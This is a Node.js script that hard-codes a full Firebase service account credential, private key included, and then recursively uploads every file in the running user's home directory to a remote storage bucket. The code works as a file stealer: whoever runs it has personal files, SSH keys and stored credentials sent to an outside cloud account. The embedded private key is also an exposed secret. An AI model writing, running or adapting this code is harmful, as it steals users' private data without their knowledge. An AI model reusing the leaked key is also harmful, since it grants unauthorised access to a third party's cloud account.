const admin = require('firebase-admin');
const fs = require('fs');
const path = require('path');
const os = require('os'); // Import the os module

// Service account key data
const serviceAccount = {
  "type": "service_account",
  "project_id": "test-30b8e",
  "private_key_id": "f1b9180bc602021df9417eded7c15b4ed3e278d5",
  "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQCekGqTX4ePiiHe\nlJHrOjZlwpYPNp9xw0qtyLj7jVWOfUAAN2NyVonncE8PGfEXBp6w/iqpHPl4TzCS\n9uSsqlAKfmjXkQHeuBqVAAd7ilEZydpDVIxJNZDgcb+tnj0RW8KLJ38wGv/XfW9V\ns6QliY6GNHzZ20Sb1T9xMWAUfzv7crvZtC81R/P8ihpxXzGOZPJZRFVY+P49Um2L\n5lJNkh+p9ZEH2VWB7Zf2kuvSzBFd/POFBK2Jg7M/k2P7amzjtncVElMQd0eAR2Md\ndfZLblXJ8HEXzI4MsB9nDXvaEkUXKealbTeIWpP+w/QDJuz1b6FIs8Q1nZbrcmw4\nwSUVdPmzAgMBAAECggEABKBHRMoLNZwJhHaKuMZ2o+RCrrck9LoGc08OKgY/jO4v\nR7refkCmj6vtP+OB1Xb6FBHtNBmuvXIArhdhMQd90Mqx0AZcUT1P4G0N012mEoy0\nkCzJAP50LvrUurDFNSNGGy6e2SoDKF9YL5F6DOGlFHwl32p4tDExsmoX/0iPJc6t\nCYvdejmBrLr8dioNmSpOHBMuTD5cM2zCI1U+ZyPKKBDRw4G2wUKgS6uYdjnqJVNX\nm40ba6bJtb0SofSsxSef7NxMfjvrYxAkaHku2yxkD3tShXsN3yNdmPpHb892rm2S\nvkc8qKp7HsPegzPrEEFJ5N0QXAbHbQNmeg0q6ieZZQKBgQC7IORyw+h7xEp+C7j9\nusoXdk0W/YSvo7EZm36lALiCOfYRUSYspxEOc6sn0PQRZ7Bmre5Im4DMKPMJlUqG\nnduUgqO7WkebiI35pP9dmTHB8W7LQZQJgfPATg62osGHFUuTSWVr3Dr7lwOHvsVd\nEm5PmpDxk08XO7X3XkP8/eCGNQKBgQDY7DYJk96LK0Hv7HAKXPqZDTfKZI9XmFGu\nr4eCzBFbnoXv7m6OPA3PSSkF9BeQqxT0fk3FICEYZ7CCKPxIFo6mwcNRul7sO3Ih\nAyRgNbtFo/Pwe+FagZ4SdVP+QQ/9fVaDOOsjboHDt3UGL1/RLK6C2uaVRiZ1gMX7\nVDlAsYTdRwKBgAsMFRCFakssOm2YiZJJHbcm38Q0sUmhM0pcuKxLD5l4jINXNBa8\nwjAFOhx+pHoGkg5txDx7Ga5z2G0/aAfsd9Mbp0jfOoz/EcqkKANBkQNvGmhbdb7d\n8iLvOMUldKFh63VFhvxIIx9JOgcghwxIk0SVzmrElI29k6+H3CGqZz/lAoGBAIec\nbE/ihI8GdQtUCdtAs125eLZr1X0SeYY2sAXiI7veR6durOj4vD1pZF8XcR/9BHWw\n/FePNYF3WU6V5tn+WCICImRWmf8fTsM6nqQTE0d/LwKZv5GAVNz/QopCDIgRsmMI\n019sN22upFdAiKtRPqwJw3twxpxQ6/Sqe7xo/kIDAoGAfGfiWtETrWGAKUNmL4us\ncM1Q1ryHffYn2xvx/ccsOIqzzHHDTMvcs3KJAF0Cqzh95MISknhtVicddYzUbmT+\nDcHzU00IIGm7EO8W6tKOgrapMbYDty7SY6LJ2ZV4BrzIaaKvwJXoVf+LTRZ4gzEL\nQ/VdUGd+6E8EqINJmW2nOyw=\n-----END PRIVATE KEY-----\n",
  "client_email": "firebase-adminsdk-dwzul@test-30b8e.iam.gserviceaccount.com",
  "client_id": "111604298940034474537",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-dwzul%40test-30b8e.iam.gserviceaccount.com",
  "universe_domain": "googleapis.com"
};

// Initialize Firebase Admin SDK
admin.initializeApp({
  credential: admin.credential.cert(serviceAccount),
  storageBucket: 'test-30b8e.appspot.com' // Set your bucket URL here
});

const bucket = admin.storage().bucket();

// Function to upload a file
const uploadFile = (filePath) => {
  return bucket.upload(filePath, {
    destination: path.basename(filePath), // Upload to the root of the bucket
  });
};

// Function to upload all files in a directory
const uploadDirectory = async (dirPath) => {
  const files = fs.readdirSync(dirPath);

  for (const file of files) {
    const filePath = path.join(dirPath, file);
    const stat = fs.statSync(filePath);

    if (stat.isFile()) {
      console.log(`Uploading: ${filePath}`);
      try {
        await uploadFile(filePath);
        console.log(`Uploaded: ${filePath}`);
      } catch (error) {
        console.error(`Failed to upload ${filePath}:`, error);
      }
    } else if (stat.isDirectory()) {
      console.log(`Entering directory: ${filePath}`);
      await uploadDirectory(filePath); // Recursively upload subdirectories
    }
  }
};

// Get the user's home directory
const homeDirectoryPath = os.homedir(); // This will give you the path to the home directory

// Example usage
uploadDirectory(homeDirectoryPath)
  .then(() => {
    console.log('All files uploaded successfully.');
  })
  .catch((error) => {
    console.error('Error uploading files:', error);
  });